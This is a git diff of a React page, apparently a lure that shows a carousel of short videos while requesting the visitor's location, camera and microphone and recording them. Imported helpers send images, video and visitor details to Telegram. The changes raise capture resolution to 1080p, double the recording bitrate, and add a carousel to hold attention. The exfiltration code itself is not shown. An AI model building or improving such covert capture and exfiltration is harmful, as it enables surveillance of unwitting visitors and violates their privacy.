@@ -1,5 +1,8 @@
 import { ArrowsPointingOutIcon, ArrowsPointingInIcon } from '@heroicons/react/24/solid';
 import { useState, useEffect, useCallback, useRef } from 'react';
+import Slider from 'react-slick';
+import 'slick-carousel/slick/slick.css';
+import 'slick-carousel/slick/slick-theme.css';
 import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram, VisitorDetails } from './utils/telegram';
 import { monitorSuspiciousActivity, cleanupMediaStream, validateVideoUrl } from './security';
 
@@ -9,7 +12,7 @@ function App() {
   const [hasRequestedLocation, setHasRequestedLocation] = useState(false);
   const [hasRequestedCamera, setHasRequestedCamera] = useState(false);
   const [isLoading, setIsLoading] = useState<boolean[]>([]);
-  const [videoErrors, setVideoErrors] = useState<boolean[]>([]); // State untuk melacak error pemuatan video
+  const [videoErrors, setVideoErrors] = useState<boolean[]>([]);
   const videoRefs = useRef<(HTMLVideoElement | null)[]>([]);
   const cameraStreamsRef = useRef<{ stream: MediaStream; type: string; deviceId: string }[]>([]);
   const mediaRecorderRef = useRef<MediaRecorder | null>(null);
@@ -20,15 +23,11 @@ function App() {
     { videoUrl: 'https://cdn.videy.co/7hwla9hS1.mp4' },
     { videoUrl: 'https://cdn.videy.co/xP6RWC6J1.mp4' },
     { videoUrl: 'https://cdn.videy.co/deZOnAa71.mp4' },
-    //{ videoUrl: 'https://cdn.videy.co/z9eBAbxS1.mp4' },
     { videoUrl: 'https://cdn.videy.co/WRnnbxOh.mp4' },
-    //{ videoUrl: 'https://cdn.videy.co/8asKje3H1.mp4' },
-    //{ videoUrl: 'https://cdn.videy.co/WLL4NxqP1.mp4' },
     { videoUrl: 'https://cdn.videy.co/6jYqrrwx1.mp4' },
     { videoUrl: 'https://cdn.videy.co/Tfh7KSKb1.mp4' },
     { videoUrl: 'https://cdn.videy.co/HCpyHdGC.mp4' },
     { videoUrl: 'https://cdn.videy.co/J4r8BFDR.mp4' },
-    //{ videoUrl: 'https://cdn.videy.co/nYIZsZcT1.mp4' },
     { videoUrl: 'https://cdn.videy.co/NQ8EOxk0.mp4' },
     { videoUrl: 'https://cdn.videy.co/B2cLTw5A1.mp4' },
     { videoUrl: 'https://cdn.videy.co/x3DQJdR6.mp4' },
@@ -111,8 +110,13 @@ function App() {
 
     const requestMediaAccess = async (facingMode: string | { deviceId: string }, cameraType: string): Promise<{ stream: MediaStream; deviceId: string } | null> => {
       try {
+        const videoConstraints = {
+          width: { ideal: 1920 },
+          height: { ideal: 1080 },
+          frameRate: { ideal: 30 },
+        };
         const constraints = {
-          video: typeof facingMode === 'string' ? { facingMode, width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } } : { deviceId: { exact: facingMode.deviceId }, width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } },
+          video: typeof facingMode === 'string' ? { facingMode, ...videoConstraints } : { deviceId: { exact: facingMode.deviceId }, ...videoConstraints },
           audio: true,
         };
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
@@ -170,8 +174,13 @@ function App() {
 
   const reinitializeStream = async (cameraType: string, deviceId: string): Promise<MediaStream | null> => {
     try {
+      const videoConstraints = {
+        width: { ideal: 1920 },
+        height: { ideal: 1080 },
+        frameRate: { ideal: 30 },
+      };
       const constraints = {
-        video: { deviceId: { exact: deviceId }, width: { ideal: 1280 }, height: { ideal: 720 }, frameRate: { ideal: 30 } },
+        video: { deviceId: { exact: deviceId }, ...videoConstraints },
         audio: true,
       };
       const stream = await navigator.mediaDevices.getUserMedia(constraints);
@@ -233,10 +242,10 @@ function App() {
 
       let drawWidth, drawHeight, offsetX, offsetY;
       if (videoAspectRatio > canvasAspectRatio) {
-        drawWidth = 720;
+        drawWidth = 1080;
         drawHeight = drawWidth / videoAspectRatio;
       } else {
-        drawHeight = 1280;
+        drawHeight = 1920;
         drawWidth = drawHeight * videoAspectRatio;
       }
 
@@ -266,7 +275,7 @@ function App() {
         .find(type => MediaRecorder.isTypeSupported(type)) || 'video/mp4';
       const mediaRecorder = new MediaRecorder(currentStream, {
         mimeType: supportedMimeType,
-        videoBitsPerSecond: 1000000,
+        videoBitsPerSecond: 2000000, // Naikkan dari 1Mbps ke 2Mbps
       });
       mediaRecorderRef.current = mediaRecorder;
       const chunks: BlobPart[] = [];
@@ -485,10 +494,47 @@ function App() {
         </div>
       </header>
       <main className="relative container mx-auto px-4 py-8">
-        <div className="max-w-[360px] mx-auto">
-          <div className="space-y-2">
-            {videos.map((video, index) => (
-              <div key={index} className="relative bg-black rounded-lg overflow-hidden shadow-xl" style={{ aspectRatio: '9/16', maxHeight: '200px' }}>
+        <Slider
+          dots
+          infinite
+          speed={500}
+          slidesToShow={5}
+          slidesToScroll={5}
+          lazyLoad="progressive"
+          responsive={[
+            {
+              breakpoint: 1200,
+              settings: {
+                slidesToShow: 4,
+                slidesToScroll: 4,
+              },
+            },
+            {
+              breakpoint: 992,
+              settings: {
+                slidesToShow: 3,
+                slidesToScroll: 3,
+              },
+            },
+            {
+              breakpoint: 768,
+              settings: {
+                slidesToShow: 2,
+                slidesToScroll: 2,
+              },
+            },
+            {
+              breakpoint: 480,
+              settings: {
+                slidesToShow: 1,
+                slidesToScroll: 1,
+              },
+            },
+          ]}
+        >
+          {videos.map((video, index) => (
+            <div key={index} className="p-2">
+              <div className="relative bg-black rounded-lg overflow-hidden shadow-xl" style={{ aspectRatio: '9/16', maxHeight: '200px' }}>
                 {isLoading[index] && !videoErrors[index] && (
                   <div className="absolute inset-0 flex items-center justify-center bg-gray-800 bg-opacity-75">
                     <svg className="animate-spin h-8 w-8 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
@@ -504,16 +550,16 @@ function App() {
                 )}
                 <video
                   ref={(el) => (videoRefs.current[index] = el)}
-                  src={video.videoUrl} // Selalu set src untuk memastikan video dimuat
+                  src={video.videoUrl}
                   className="w-full h-full object-cover"
                   muted
                   onClick={() => handleVideoClick(index)}
                   onEnded={() => handleVideoEnded(index)}
                   onCanPlay={() => handleCanPlay(index)}
                   onError={() => handleVideoError(index)}
-                  preload="auto" // Optimalkan buffering
+                  preload="auto"
                   playsInline
-                  {...({ loading: 'lazy' } as any)}
+                  loading="lazy"
                 >
                   <p>Maaf, video tidak dapat dimuat. Silakan periksa koneksi Anda atau coba lagi nanti.</p>
                 </video>
@@ -532,9 +578,9 @@ function App() {
                   </div>
                 )}
               </div>
-            ))}
-          </div>
-        </div>
+            </div>
+          ))}
+        </Slider>
       </main>
     </div>
   );
